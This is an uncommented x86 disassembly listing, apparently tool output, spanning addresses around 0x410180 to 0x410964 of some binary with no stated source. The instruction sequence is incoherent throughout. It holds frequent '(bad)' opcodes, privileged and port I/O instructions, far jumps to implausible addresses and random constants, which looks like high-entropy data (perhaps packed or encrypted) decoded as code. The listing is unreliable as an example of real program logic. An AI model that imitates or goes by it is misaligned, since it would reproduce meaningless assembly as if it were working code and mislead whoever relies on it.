  410180:	and    DWORD PTR [ecx+0x36],0xe68b7939
  410187:	sub    al,BYTE PTR [eax]
  410189:	xor    dl,bl
  41018b:	mov    esi,0xd618205d
  410190:	mov    DWORD PTR [edx],esp
  410192:	sbb    edx,DWORD PTR [edx]
  410194:	jae    0x41012c
  410196:	mov    al,ds:0x8acedfb1
  41019b:	fsub   st(4),st
  41019d:	jns    0x410171
  41019f:	adc    eax,0xfc31ffe7
  4101a4:	std    
  4101a5:	pop    ecx
  4101a6:	inc    ebp
  4101a7:	inc    edi
  4101a9:	pop    esp
  4101aa:	lea    eax,[edi]
  4101ac:	dec    edx
  4101ad:	(bad)  
  4101ae:	jnp    0x4101d9
  4101b0:	xchg   esi,eax
  4101b1:	test   eax,0x9270b965
  4101b6:	lea    ebx,[edi+0x600384cd]
  4101bc:	cmc    
  4101bd:	push   edi
  4101be:	sbb    edx,DWORD PTR [ebx+eax*4-0x23]
  4101c2:	ret    0xefa5
  4101c5:	mov    esi,0xaabeacdb
  4101ca:	int    0x90
  4101cc:	inc    esi
  4101cd:	int3   
  4101ce:	cmp    dl,0xf
  4101d1:	in     al,0xe4
  4101d3:	cmp    DWORD PTR ds:0x747d0b12,0xc3ef2508
  4101dd:	das    
  4101de:	mov    ds:0xd9de5e49,eax
  4101e3:	ret    0x1fe3
  4101e6:	mov    esi,0xa7f42741
  4101eb:	bound  ebp,QWORD PTR ds:0x686bc33d
  4101f1:	xchg   esi,eax
  4101f2:	inc    edx
  4101f3:	fwait
  4101f4:	lds    ecx,FWORD PTR [eax+ebx*1-0x2dbff8b2]
  4101fb:	cmp    eax,0xdad8592c
  410200:	inc    ebx
  410202:	stos   BYTE PTR es:[edi],al
  410203:	jo     0x410229
  410205:	jae    0x410220
  410207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410208:	push   cs
  410209:	mov    ebp,0x4f60a0cd
  41020e:	pop    ebx
  41020f:	mov    cl,0x5e
  410211:	fistp  QWORD PTR [eax]
  410213:	out    0x2a,al
  410215:	jmp    0x3d50d44d
  41021a:	lahf   
  41021b:	retf   
  41021c:	data16 stos BYTE PTR es:[edi],al
  41021e:	sub    cl,bl
  410220:	push   ebx
  410221:	(bad)  
  410222:	sar    al,1
  410224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410225:	dec    edi
  410226:	and    bh,BYTE PTR [eax]
  410228:	xor    ecx,eax
  41022a:	sbb    DWORD PTR [ebx],esi
  41022c:	fwait
  41022d:	and    al,0xe6
  41022f:	loope  0x4101ce
  410231:	call   0x4b73eac8
  410236:	or     al,0x9d
  410238:	(bad)  
  41023a:	fmul   DWORD PTR [esi-0x54]
  41023d:	push   ecx
  41023e:	xchg   ebp,eax
  41023f:	in     al,0x1
  410241:	jne    0x4101f3
  410243:	mov    al,ds:0x18fd860d
  410248:	sub    dl,BYTE PTR [esi-0x2b]
  41024b:	vpaddd xmm6,xmm1,XMMWORD PTR cs:[ebp-0x40]
  410251:	jb     0x410203
  410253:	xor    eax,0x320586e6
  410258:	sahf   
  410259:	mov    bl,0xa
  41025b:	push   edi
  41025c:	lock dec esp
  41025e:	adc    al,0x79
  410260:	sbb    ecx,ebp
  410262:	daa    
  410263:	js     0x4102a8
  410265:	fld    QWORD PTR [esi]
  410267:	lahf   
  410268:	jo     0x41026e
  41026a:	mov    ds:0x98b74c8b,eax
  41026f:	into   
  410270:	and    bl,BYTE PTR [edx+0x1]
  410273:	sbb    al,0x75
  410275:	dec    edx
  410276:	and    eax,0x112b484a
  41027b:	xchg   edx,eax
  41027c:	mov    es,WORD PTR [ebx+0x47758f27]
  410282:	push   0xab03a743
  410287:	mov    edx,esi
  410289:	mov    edx,0xfab52587
  41028e:	xchg   esp,eax
  41028f:	sbb    BYTE PTR [eax+0x38],cl
  410292:	pushf  
  410293:	hlt    
  410294:	cmp    esi,DWORD PTR [ebx]
  410296:	pop    ebx
  410297:	xchg   BYTE PTR [edx+0x3415e4c4],bl
  41029d:	or     eax,0x5a979f9c
  4102a2:	and    al,0x30
  4102a4:	je     0x4102a3
  4102a6:	imul   ebx,DWORD PTR [ecx-0x729e17fa],0x39
  4102ad:	jl     0x4102bc
  4102af:	jmp    DWORD PTR [esi+0xb094449]
  4102b5:	mov    ch,0xcb
  4102b7:	push   es
  4102b8:	xor    edi,ebp
  4102ba:	cmp    BYTE PTR [edx-0x1],ch
  4102bd:	or     al,al
  4102bf:	mov    ebx,DWORD PTR [ebp+0x2]
  4102c2:	dec    ecx
  4102c3:	sub    BYTE PTR [ebp+0x515ddcfa],bl
  4102c9:	mov    eax,0x4afe2253
  4102ce:	push   ecx
  4102cf:	aas    
  4102d0:	out    dx,eax
  4102d1:	test   BYTE PTR [edi],bh
  4102d3:	pusha  
  4102d4:	or     eax,0xe3c406bb
  4102d9:	sbb    DWORD PTR [eax],0xffffffaf
  4102dc:	sub    DWORD PTR [ecx+0x3de54892],eax
  4102e2:	dec    ecx
  4102e3:	es push edx
  4102e5:	xor    eax,0x8dc73239
  4102ea:	outs   dx,BYTE PTR ds:[esi]
  4102eb:	xlat   BYTE PTR ds:[ebx]
  4102ec:	int    0xbb
  4102ee:	(bad)  
  4102ef:	push   0x5d
  4102f1:	clc    
  4102f2:	mov    bl,0xf9
  4102f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f5:	mov    BYTE PTR [ecx+0x5a],ch
  4102f8:	mov    ch,0xd4
  4102fa:	retf   
  4102fb:	xchg   edi,eax
  4102fc:	push   es
  4102fd:	out    dx,al
  4102fe:	add    ah,dh
  410300:	jns    0x41035f
  410302:	add    DWORD PTR [esi-0x2917fccb],esi
  410308:	(bad)  
  410309:	popa   
  41030a:	mov    cl,0x4d
  41030c:	js     0x4102c0
  41030e:	pushf  
  41030f:	mov    bh,0x4a
  410311:	fincstp 
  410313:	jns    0x41038c
  410315:	xlat   BYTE PTR ds:[ebx]
  410316:	jae    0x4102fb
  410318:	rcr    BYTE PTR ds:[esi],cl
  41031b:	imul   edx,eax,0x17
  41031e:	jb     0x4102fd
  410320:	out    dx,al
  410321:	ja     0x4102ae
  410323:	inc    ebx
  410324:	jns    0x4102b5
  410326:	xor    eax,DWORD PTR [esi+0x174b1273]
  41032c:	ret    
  41032d:	mov    eax,ds:0xb6b7fee2
  410332:	jo     0x410345
  410334:	jo     0x410384
  410336:	xor    eax,0xb1002863
  41033b:	pop    edx
  41033c:	jb     0x4102fd
  41033e:	xchg   edx,eax
  41033f:	pop    ebx
  410340:	mov    ds:0xc66a80f6,eax
  410345:	stos   DWORD PTR es:[edi],eax
  410346:	xor    DWORD PTR [ebx-0x1b239904],esi
  41034c:	(bad)  
  41034d:	fst    DWORD PTR [eax-0x40ce594e]
  410353:	and    al,0xb5
  410355:	enter  0x6fd3,0xe7
  410359:	adc    BYTE PTR [ecx-0x7e08b555],ch
  41035f:	aas    
  410360:	test   eax,0x31d19aee
  410365:	test   eax,0x3ecba5ca
  41036a:	dec    eax
  41036b:	push   0x39
  41036d:	push   ebp
  41036e:	inc    ebp
  41036f:	xor    BYTE PTR [ebp-0x17bbc231],al
  410375:	jecxz  0x41034d
  410377:	dec    edx
  410378:	divps  xmm2,XMMWORD PTR [edi+0x34]
  41037c:	and    ah,BYTE PTR [esi]
  41037e:	retf   0xa2da
  410381:	sahf   
  410382:	js     0x410393
  410384:	mov    ecx,0x9f817b50
  410389:	ins    DWORD PTR es:[edi],dx
  41038a:	jns    0x4103d2
  41038c:	ins    DWORD PTR es:[edi],dx
  41038d:	xchg   ecx,eax
  41038e:	and    ebp,DWORD PTR [ebx+0x7a5cdad4]
  410394:	pop    ds
  410395:	in     eax,0x95
  410397:	mov    dl,0x62
  410399:	push   ecx
  41039a:	push   ss
  41039b:	push   edi
  41039c:	(bad)  
  41039d:	mov    edi,0x11d71060
  4103a2:	sub    al,0x44
  4103a4:	fistp  WORD PTR [eax-0x5494738e]
  4103aa:	call   DWORD PTR [edx]
  4103ac:	cwde   
  4103ad:	sub    eax,edx
  4103af:	xchg   edx,eax
  4103b0:	pop    ds
  4103b1:	push   0x777ef4ea
  4103b6:	jne    0x41042f
  4103b8:	dec    edx
  4103b9:	inc    ebx
  4103ba:	cmp    DWORD PTR ds:[esp+esi*8-0x74],edi
  4103bf:	je     0x410351
  4103c1:	cld    
  4103c2:	sub    eax,0xfc869402
  4103c7:	frstor ds:0x62ae6fd4
  4103cd:	xchg   ecx,eax
  4103ce:	jae    0x4103c2
  4103d0:	push   cs
  4103d1:	jecxz  0x410362
  4103d3:	sbb    eax,0xc3e734d2
  4103d8:	or     al,0x9a
  4103da:	inc    ebp
  4103db:	loop   0x410414
  4103dd:	xchg   bl,al
  4103df:	aas    
  4103e0:	jecxz  0x410428
  4103e2:	imul   edx,eax,0xffffffd8
  4103e5:	adc    bl,cl
  4103e7:	xchg   ecx,eax
  4103e8:	dec    eax
  4103e9:	add    edx,DWORD PTR ds:0xf93104a9
  4103ef:	and    DWORD PTR [ebx-0x54173428],esp
  4103f5:	add    DWORD PTR ds:0x560c75c9,edx
  4103fb:	jb     0x4103bf
  4103fd:	mov    edi,DWORD PTR [edx]
  4103ff:	add    al,0xa3
  410401:	fdivp  st(6),st
  410403:	and    ebp,ecx
  410405:	jp     0x4103e0
  410407:	clc    
  410408:	dec    edx
  410409:	xor    ebx,0xffffffb3
  41040c:	mov    DWORD PTR [ebp-0x79],0x9ff9eb05
  410413:	pop    eax
  410414:	xor    dh,al
  410416:	or     eax,0xcae28e7f
  41041b:	pop    ebx
  41041c:	test   eax,0x2780364
  410421:	push   es
  410422:	fisub  WORD PTR [ebp+0x342f6f4e]
  410428:	(bad)  
  410429:	cld    
  41042a:	xor    al,0x78
  41042c:	mov    ebp,0x9e6deeee
  410431:	push   0x8298dfc8
  410436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410437:	inc    ebx
  410438:	(bad)  
  410439:	test   BYTE PTR [ebx+0x6386ca60],ch
  41043f:	sbb    ch,dh
  410441:	fidivr WORD PTR [ebx]
  410443:	rcl    al,cl
  410445:	test   eax,0x63958302
  41044a:	pop    ss
  41044b:	leave  
  41044c:	jle    0x4104b3
  41044e:	add    DWORD PTR [edx],edx
  410450:	cmc    
  410451:	gs add eax,0x42383235
  410457:	xor    ah,BYTE PTR [esi]
  410459:	arpl   WORD PTR [eax-0x73],bp
  41045c:	cli    
  41045d:	test   DWORD PTR [ecx+0x7e],ebp
  410460:	mov    bl,0xc3
  410462:	int    0x4a
  410464:	ror    DWORD PTR [esi-0x334e1ec1],cl
  41046a:	pop    ss
  41046b:	push   0xa2c4a020
  410470:	fdiv   QWORD PTR [eax]
  410472:	mov    ebp,0x99034c21
  410477:	lock dec ecx
  410479:	sbb    eax,0x675de88b
  41047e:	pop    eax
  41047f:	and    eax,0x7e87d99d
  410484:	in     al,0x78
  410486:	adc    DWORD PTR [ebp-0x44],esi
  410489:	fcom   DWORD PTR [ebx+eiz*2+0x6d349ad]
  410490:	jle    0x4104a7
  410492:	aas    
  410493:	scas   eax,DWORD PTR es:[edi]
  410494:	mov    edx,esi
  410496:	loop   0x410446
  410498:	jl     0x41041a
  41049a:	adc    al,dh
  41049c:	sub    esp,DWORD PTR [ecx-0x5d]
  41049f:	sbb    eax,0x33928260
  4104a4:	(bad)  
  4104a5:	mov    esi,0x15953654
  4104aa:	inc    edx
  4104ab:	call   0xf256b114
  4104b0:	push   esp
  4104b1:	shr    BYTE PTR [esi-0x68],0xdb
  4104b5:	jecxz  0x4104c7
  4104b7:	mov    esp,?
  4104b9:	lahf   
  4104ba:	adc    ebp,esi
  4104bc:	jbe    0x410449
  4104be:	inc    esi
  4104bf:	add    al,0xfa
  4104c1:	xchg   BYTE PTR [edi+0x1b],ch
  4104c4:	mov    dl,0x82
  4104c6:	inc    eax
  4104c7:	add    edx,DWORD PTR [ebp+0x2a333cb8]
  4104cd:	das    
  4104ce:	repnz test al,0xcb
  4104d1:	lock or al,0x20
  4104d4:	loop   0x4104db
  4104d6:	push   ss
  4104d7:	mov    ebp,0x20ebb3fa
  4104dc:	jmp    0x410517
  4104de:	retf   0xdcb
  4104e1:	xchg   ebp,eax
  4104e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104e3:	inc    ecx
  4104e4:	mov    esp,0xfd3ac3ca
  4104e9:	ffreep st(4)
  4104eb:	jp     0x4104fc
  4104ed:	jg     0x41047a
  4104ef:	push   esp
  4104f0:	sub    ah,BYTE PTR [ecx+0x44ad7e72]
  4104f6:	or     eax,0x6d5e23c8
  4104fb:	mov    dl,0xc8
  4104fd:	mov    WORD PTR [edi-0x228779bd],es
  410503:	addr16 xchg edi,eax
  410505:	dec    eax
  410506:	(bad)  
  410508:	push   ebp
  410509:	repnz sbb DWORD PTR [ebx-0x4f],eax
  41050d:	push   edx
  41050e:	arpl   bp,sp
  410510:	add    eax,0xe7286c13
  410515:	dec    eax
  410516:	stos   BYTE PTR es:[edi],al
  410517:	add    BYTE PTR [esi+edi*1+0x54bc1fed],al
  41051e:	cwde   
  41051f:	cmp    ebp,esi
  410521:	jecxz  0x4104bd
  410523:	and    ecx,ebp
  410525:	mov    bh,0xf4
  410527:	loop   0x41056f
  410529:	not    DWORD PTR [eax]
  41052b:	lods   eax,DWORD PTR ds:[esi]
  41052c:	sub    BYTE PTR [esp+edx*4+0x65],0xa4
  410531:	fst    QWORD PTR [edx+0x57]
  410534:	cmp    ch,BYTE PTR [edi-0x5f]
  410537:	mov    esi,esi
  410539:	add    BYTE PTR [eax],ah
  41053b:	adc    al,al
  41053d:	xchg   esp,eax
  41053e:	lods   eax,DWORD PTR ds:[esi]
  41053f:	jl     0x4105a3
  410541:	in     al,dx
  410542:	push   ebp
  410543:	cmp    BYTE PTR [edx+0x6],dh
  410546:	loop   0x410533
  410548:	prefetch BYTE PTR [ebx-0x55689f1c]
  41054f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410550:	nop
  410551:	inc    ecx
  410552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410553:	jp     0x41058d
  410555:	and    al,0x58
  410557:	loope  0x4105a6
  410559:	lds    ebx,FWORD PTR [eax+0x5a9e4a90]
  41055f:	loopne 0x4105b1
  410561:	inc    ebp
  410562:	cdq    
  410563:	jp     0x410569
  410565:	pmaxsw mm2,mm4
  410568:	xchg   edi,eax
  410569:	shl    DWORD PTR ds:0xcbfeaa9b,1
  41056f:	adc    al,0x28
  410571:	call   0x239c9dc2
  410576:	mov    ah,0xde
  410578:	cwde   
  410579:	shr    ebx,cl
  41057b:	loop   0x4104fd
  41057d:	cmc    
  41057e:	aas    
  41057f:	cwde   
  410580:	popf   
  410581:	inc    esi
  410582:	inc    ecx
  410583:	sub    eax,0x662c0187
  410588:	imul   edx,DWORD PTR [eax],0x5d
  41058b:	addr16 into 
  41058d:	(bad)  
  41058e:	outs   dx,DWORD PTR ds:[esi]
  41058f:	push   esi
  410590:	loope  0x41057f
  410592:	es push edx
  410594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410595:	rcr    BYTE PTR [esi],cl
  410597:	and    bh,BYTE PTR [ebx]
  410599:	mov    cl,0x74
  41059b:	icebp  
  41059c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41059d:	icebp  
  41059e:	lahf   
  41059f:	pop    esi
  4105a0:	cmp    DWORD PTR [edx+0x3c344056],ecx
  4105a6:	ins    DWORD PTR es:[edi],dx
  4105a7:	arpl   cx,cx
  4105a9:	push   es
  4105aa:	in     al,dx
  4105ab:	or     eax,0x3aa371bd
  4105b1:	or     edi,ebp
  4105b3:	push   0x51
  4105b5:	cwde   
  4105b6:	pop    esi
  4105b7:	or     eax,eax
  4105b9:	popa   
  4105ba:	imul   esi,ebp,0x7b
  4105bd:	pop    eax
  4105be:	adc    eax,0xa19b1f3a
  4105c3:	fild   WORD PTR [ecx+0x5]
  4105c6:	(bad)  
  4105c7:	iret   
  4105c8:	dec    esi
  4105c9:	hlt    
  4105ca:	data16 rcr cl,1
  4105cd:	jno    0x41058c
  4105cf:	pop    ds
  4105d0:	std    
  4105d1:	out    0xba,al
  4105d3:	mov    WORD PTR [ecx+0x3712d6e4],?
  4105d9:	jecxz  0x410581
  4105db:	(bad)  
  4105dc:	ss fadd st(0),st
  4105df:	test   eax,0x62d5d7e
  4105e4:	lods   eax,DWORD PTR ds:[esi]
  4105e5:	or     al,0x8c
  4105e7:	mov    ah,cl
  4105e9:	pop    es
  4105ea:	mov    ecx,0xb761dbd1
  4105ef:	jp     0x4105f1
  4105f1:	mov    edi,0x8c81639f
  4105f6:	enter  0x9af7,0x8f
  4105fa:	mov    ch,0xb
  4105fc:	push   0x44
  4105fe:	arpl   WORD PTR [esi-0x3a],di
  410601:	jmp    0xb1efaf29
  410606:	dec    eax
  410607:	jo     0x4105c7
  410609:	xchg   edx,eax
  41060a:	fidiv  DWORD PTR [ecx]
  41060c:	sub    dl,dl
  41060e:	jo     0x41063f
  410610:	xor    al,0xd9
  410612:	(bad)  
  410613:	clc    
  410614:	add    BYTE PTR [ebp-0x69],dh
  410617:	ror    DWORD PTR [ebx+0x18],1
  41061a:	jp     0x4105fb
  41061c:	xchg   ecx,eax
  41061d:	dec    eax
  41061e:	push   ss
  41061f:	mov    al,ds:0xda4449e
  410624:	scas   eax,DWORD PTR es:[edi]
  410625:	in     al,dx
  410626:	pop    esi
  410627:	sub    ah,bh
  410629:	ja     0x41060d
  41062b:	popf   
  41062c:	ret    
  41062d:	jmp    0xdcde:0x290ad282
  410634:	xchg   edi,eax
  410635:	push   ss
  410636:	mov    ds:0xf54d5007,eax
  41063b:	in     eax,dx
  41063c:	pop    esp
  41063d:	dec    edx
  41063e:	push   es
  41063f:	retf   0xeeab
  410642:	ret    0x46ea
  410645:	mov    al,0xf4
  410647:	jbe    0x41064a
  410649:	stos   DWORD PTR es:[edi],eax
  41064a:	bound  edi,QWORD PTR [ecx]
  41064c:	cmp    BYTE PTR [ebx],ah
  41064e:	sbb    edi,DWORD PTR [edx+0x3ceaff8a]
  410654:	aad    0xdb
  410656:	hlt    
  410657:	dec    ecx
  410658:	jbe    0x41066a
  41065a:	cmp    eax,0xacb78a
  41065f:	push   ebp
  410660:	(bad)  
  410661:	mov    al,ds:0xd73eb1d2
  410666:	outs   dx,BYTE PTR ds:[esi]
  410667:	aam    0x6d
  410669:	xor    ah,dh
  41066b:	es pop esp
  41066d:	add    BYTE PTR [eax],ah
  41066f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410670:	dec    esp
  410671:	jecxz  0x410674
  410673:	ret    0xa60
  410676:	outs   dx,DWORD PTR ds:[esi]
  410677:	sti    
  410678:	sbb    bh,bh
  41067a:	sub    eax,0x4b0814c0
  41067f:	cmp    BYTE PTR [edi-0x16576d9b],dh
  410685:	inc    esi
  410686:	pop    esp
  410687:	nop
  410688:	addr16 pop esi
  41068a:	pushf  
  41068b:	inc    ebx
  41068c:	arpl   WORD PTR [ecx-0xb],dx
  41068f:	jb     0x410663
  410691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410692:	imul   eax,DWORD PTR [ebx-0x47e9bf49],0x46
  410699:	mov    bl,0x52
  41069b:	int    0x16
  41069d:	bound  ebp,QWORD PTR [esi-0x58235a5f]
  4106a3:	out    0xb5,al
  4106a5:	xor    DWORD PTR [edx-0x2d],ebx
  4106a8:	and    DWORD PTR [esi],0xd302a477
  4106ae:	in     eax,dx
  4106af:	(bad)  [ecx-0x3b83c205]
  4106b5:	mov    WORD PTR [eax],?
  4106b7:	or     edx,eax
  4106b9:	test   BYTE PTR [eax+ebp*4],0xfc
  4106bd:	mov    al,ds:0xfc3bb68e
  4106c2:	dec    ebx
  4106c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c4:	out    0xab,al
  4106c6:	mov    ah,0xab
  4106c8:	cmp    BYTE PTR [ebp+0x10a8aeeb],dh
  4106ce:	xor    ch,dl
  4106d0:	jbe    0x4106bf
  4106d2:	cmp    ebp,DWORD PTR [esi-0x71]
  4106d5:	aas    
  4106d6:	sbb    esi,DWORD PTR [esi]
  4106d8:	mov    eax,0x9bc560e1
  4106dd:	bound  edx,QWORD PTR [ecx-0x25729ea8]
  4106e3:	adc    eax,0x194ec191
  4106e8:	sbb    eax,0x3625df01
  4106ed:	fmul   st,st(3)
  4106ef:	jno    0x41069a
  4106f1:	in     al,dx
  4106f2:	daa    
  4106f3:	jnp    0x4106b2
  4106f5:	test   BYTE PTR [ecx],al
  4106f7:	mov    ecx,gs
  4106f9:	unpcklps xmm1,XMMWORD PTR [esi+0x28]
  4106fd:	xchg   edx,eax
  4106fe:	xchg   ebx,eax
  4106ff:	push   0x9379504e
  410704:	mov    ds:0x94f51e7a,eax
  410709:	xchg   esi,eax
  41070a:	pop    edi
  41070b:	xchg   BYTE PTR [ebx+ebx*1-0x4f],ah
  41070f:	iret   
  410710:	add    DWORD PTR [edx],esp
  410712:	or     al,cl
  410714:	add    ebx,DWORD PTR [ebp+0x47731c68]
  41071a:	in     al,0x5b
  41071c:	push   eax
  41071d:	sbb    BYTE PTR [esi],ah
  41071f:	in     eax,0x34
  410721:	or     esp,DWORD PTR [eax-0x4aef54c7]
  410727:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410729:	push   0x59acdbb0
  41072e:	push   0x676d42e
  410733:	xchg   esi,eax
  410734:	clc    
  410735:	jnp    0x4107ab
  410737:	pushf  
  410738:	sbb    al,0x6c
  41073a:	not    BYTE PTR [ebx+0x1d]
  41073d:	push   edx
  41073e:	xchg   BYTE PTR [ebx-0x5f2f7596],dl
  410744:	xchg   esi,eax
  410745:	pop    ebx
  410746:	cli    
  410747:	sub    BYTE PTR [edx+0x50],ah
  41074a:	mov    bh,0x32
  41074c:	jne    0x41073b
  41074e:	pop    edi
  41074f:	pop    ds
  410750:	int3   
  410751:	dec    edx
  410752:	not    BYTE PTR ds:0x27732445
  410758:	(bad)  
  410759:	or     esp,DWORD PTR [esi+eiz*2+0x56]
  41075d:	sub    BYTE PTR [esi+0xc4d4973],dl
  410763:	shr    dh,1
  410765:	push   ds
  410766:	out    dx,eax
  410767:	lds    esi,FWORD PTR [esi]
  410769:	or     DWORD PTR [edi+0x41815631],esp
  41076f:	dec    esp
  410770:	shr    BYTE PTR [ecx-0x2d7f2cff],cl
  410776:	jae    0x41074e
  410778:	loope  0x41077d
  41077a:	js     0x410753
  41077c:	jnp    0x41079a
  41077e:	mov    edi,0x16c0dfc7
  410783:	jmp    0xcaa9:0xff4a4c4c
  41078a:	add    DWORD PTR [ebx],esi
  41078c:	jp     0x41079a
  41078e:	mov    ds:0xa73969d6,eax
  410793:	pop    ebx
  410794:	cli    
  410795:	inc    edi
  410796:	in     al,dx
  410797:	push   ebx
  410798:	or     DWORD PTR [ebx],ebx
  41079a:	jns    0x4107ea
  41079c:	xchg   ebx,eax
  41079d:	lds    edi,FWORD PTR [edx]
  41079f:	cmp    ebx,ebx
  4107a1:	jno    0x4107fb
  4107a3:	pop    esp
  4107a4:	test   al,0x21
  4107a6:	inc    edi
  4107a7:	in     al,0x2d
  4107a9:	sbb    bl,ch
  4107ab:	in     al,0xf7
  4107ad:	pusha  
  4107ae:	lods   al,BYTE PTR ds:[esi]
  4107af:	popa   
  4107b0:	jbe    0x41076e
  4107b2:	dec    ebx
  4107b3:	out    dx,eax
  4107b4:	test   DWORD PTR [edi+0x51],ebp
  4107b7:	addr16 pop ds
  4107b9:	xor    al,0xd3
  4107bb:	mov    dl,0x2f
  4107bd:	push   es
  4107be:	pop    ss
  4107bf:	ror    BYTE PTR [ecx-0x3030f8e4],cl
  4107c5:	arpl   bx,si
  4107c7:	sub    BYTE PTR [ecx-0x4309df38],al
  4107cd:	xchg   edi,eax
  4107ce:	dec    esi
  4107cf:	add    al,0x4f
  4107d1:	sbb    eax,0x6147fc4b
  4107d6:	popf   
  4107d7:	je     0x410842
  4107d9:	aam    0x97
  4107db:	ds leave 
  4107dd:	xchg   BYTE PTR [eax*1+0x271b66e1],bh
  4107e4:	out    dx,al
  4107e5:	loop   0x41084f
  4107e7:	push   es
  4107e8:	addr16 push edi
  4107ea:	cmp    eax,0xb56c13c0
  4107ef:	adc    bl,BYTE PTR [ecx+0x34f082a4]
  4107f5:	adc    edi,eax
  4107f7:	idiv   DWORD PTR [ebx-0x21a59e19]
  4107fd:	adc    al,0xe9
  4107ff:	and    al,0xaf
  410801:	lods   al,BYTE PTR ds:[esi]
  410802:	inc    ebx
  410803:	pop    es
  410804:	and    DWORD PTR [edx+0x25],edi
  410807:	lods   al,BYTE PTR ds:[esi]
  410808:	loop   0x4107e0
  41080a:	xchg   ebx,eax
  41080b:	pushf  
  41080c:	push   ds
  41080d:	rcl    eax,cl
  41080f:	jle    0x4107b9
  410811:	mov    ds:0x4c8ad9,eax
  410816:	jne    0x410811
  410818:	mov    gs,WORD PTR [ebx+0x5aef1d75]
  41081e:	push   eax
  41081f:	sub    al,0x6d
  410821:	dec    esp
  410822:	or     eax,0x7a6079f
  410827:	lock mov bl,0x27
  41082a:	ror    DWORD PTR [esp+esi*1],1
  41082d:	push   esi
  41082e:	xchg   ebx,eax
  41082f:	pop    edx
  410830:	add    DWORD PTR [eax+edx*2+0x6c],0xf7597794
  410838:	jmp    0x4107f2
  41083a:	out    dx,al
  41083b:	sub    DWORD PTR [ecx],ebp
  41083d:	dec    ecx
  41083e:	lea    ebx,[esi-0x80]
  410841:	test   eax,0x95085fb0
  410846:	fiadd  WORD PTR [edi-0x6f8a30f5]
  41084c:	pop    esp
  41084d:	adc    DWORD PTR [ebx+ebx*1-0x6aa72f40],edx
  410854:	ret    0x7e54
  410857:	mov    ecx,0xde1b5cbb
  41085c:	stos   DWORD PTR es:[edi],eax
  41085d:	sub    DWORD PTR [edx+0x7ad290e2],0x852850a6
  410867:	mov    edx,edx
  410869:	adc    al,0xc8
  41086b:	mov    gs,WORD PTR [eax-0x1fc1be2f]
  410871:	dec    esi
  410872:	(bad)  [eax]
  410874:	push   edi
  410875:	xor    BYTE PTR [ebx],ah
  410877:	push   esp
  410878:	or     edx,esp
  41087a:	lock call 0x20a3:0x9a518785
  410882:	shl    BYTE PTR [ebx],0x93
  410885:	test   eax,0xc44e7362
  41088a:	dec    edi
  41088b:	push   ecx
  41088c:	inc    ebx
  41088d:	cmp    al,0xee
  41088f:	in     eax,dx
  410890:	push   ebx
  410891:	push   edi
  410892:	shl    BYTE PTR [edx+0x58422f5c],1
  410898:	fcom   QWORD PTR [edi]
  41089a:	pop    ss
  41089b:	jecxz  0x4108fb
  41089d:	inc    edi
  41089e:	cmp    bh,bl
  4108a0:	or     bl,cl
  4108a2:	pop    edx
  4108a3:	jle    0x4108f5
  4108a5:	cdq    
  4108a6:	clc    
  4108a7:	mov    bl,0x13
  4108a9:	pop    ds
  4108aa:	sti    
  4108ab:	mov    cs,WORD PTR [edi+0x1bfa51e1]
  4108b1:	xlat   BYTE PTR ds:[ebx]
  4108b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108b3:	out    0x88,al
  4108b5:	push   esp
  4108b6:	bound  esi,QWORD PTR [ebx]
  4108b8:	rol    DWORD PTR [ecx+eiz*2],1
  4108bb:	test   al,0x82
  4108bd:	in     al,dx
  4108be:	ror    DWORD PTR [ecx+0x7c],1
  4108c1:	push   esp
  4108c2:	push   ebx
  4108c3:	mov    eax,ds:0x3bf4299
  4108c8:	int    0x6b
  4108ca:	sbb    eax,0x6ea08d31
  4108cf:	or     al,0x0
  4108d1:	add    eax,0xc79e5cb9
  4108d6:	gs sti 
  4108d8:	and    BYTE PTR [eax],0x55
  4108db:	sub    esi,DWORD PTR [ecx-0x256b331d]
  4108e1:	les    esi,FWORD PTR [ebx+0x1b]
  4108e4:	icebp  
  4108e5:	je     0x410955
  4108e7:	shl    DWORD PTR [ebx],0xbf
  4108ea:	out    0x69,eax
  4108ec:	sub    eax,0xdece7804
  4108f1:	popf   
  4108f2:	int    0x76
  4108f4:	push   esp
  4108f5:	aad    0xcd
  4108f7:	pop    es
  4108f8:	and    eax,0x403d8cb7
  4108fd:	imul   ebx,DWORD PTR [ebx+ebx*2-0x34],0x561f26bd
  410905:	call   0x112b54a6
  41090a:	sar    DWORD PTR [esi+0x54],0xb2
  41090e:	sbb    al,0x4c
  410910:	ins    DWORD PTR es:[edi],dx
  410911:	adc    ecx,DWORD PTR [ebx]
  410913:	gs mov ecx,0xbdd0afd
  410919:	push   es
  41091a:	sub    al,0x1b
  41091c:	inc    ebp
  41091d:	xchg   edx,eax
  41091e:	push   ebp
  41091f:	mov    edi,0x93a11735
  410924:	out    dx,al
  410925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410926:	outs   dx,BYTE PTR ds:[esi]
  410927:	je     0x41098a
  410929:	mov    cl,0x63
  41092b:	outs   dx,DWORD PTR ds:[esi]
  41092d:	add    eax,0x55b0f8f5
  410932:	xor    cl,bl
  410934:	cmp    DWORD PTR [ebx-0x4fbfa47c],ebp
  41093a:	out    0x1e,al
  41093c:	lds    eax,FWORD PTR [eax]
  41093e:	pop    edx
  41093f:	into   
  410940:	lea    eax,[ebp-0x1857ef3a]
  410946:	enter  0xcc6c,0xd5
  41094a:	ja     0x4108e0
  41094c:	fisttp QWORD PTR [ebp-0x20]
  41094f:	ficom  WORD PTR [edi+0x70]
  410952:	jle    0x4109c2
  410954:	xor    DWORD PTR [edi+0x5358db9f],0x9ab5cd6d
  41095e:	sbb    al,0x2b
  410960:	imul   DWORD PTR [edx]
  410962:	mov    bh,0x66
  410964:	and    BYTE PTR ds:[ebp+esi*1+0x24],ah
